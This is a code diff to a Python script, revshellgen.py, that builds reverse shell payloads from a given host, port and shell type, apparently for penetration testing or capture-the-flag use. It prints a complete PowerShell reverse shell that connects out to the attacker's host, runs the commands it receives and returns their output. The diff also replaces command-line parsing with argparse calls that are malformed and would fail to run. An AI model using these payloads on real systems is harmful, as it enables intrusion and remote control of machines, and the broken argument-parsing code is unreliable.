@@ -1,5 +1,6 @@
 # Generate reverse shell from host and port
 # Usage: python3 revshellgen.py <host> <port> <type>
+import argparse
 
 def generate_revshell_payload(host, port, type):
     if type == "bash":
@@ -22,11 +23,19 @@ def generate_revshell_payload(host, port, type):
         return f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{host}\",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
 
 if __name__ == "__main__":
-    import sys
-    if len(sys.argv) != 4:
-        print("Usage: python3 revshellgen.py <host> <port> <type>")
-        print("Example: python3 revshellgen.py 10.10.14.8 9001 bash")
-        sys.exit(1)
-    
-    host, port, type = sys.argv[1], sys.argv[2], sys.argv[3]
-    print(generate_revshell_payload(host, port, type))
+    parser = argparse.ArgumentParser(description="Generate reverse shell payload")
+    parser.add_argument(
+        host="host",
+        help="Host to connect back to",
+    )
+    parser.add_argument(
+        port="port",
+        help="Port to connect back to",
+    )
+    parser.add_argument(
+        type="type",
+        help="Type of reverse shell",
+    )
+
+    args = parser.parse_args()
+    print(generate_revshell_payload(args.host, args.port, args.type))
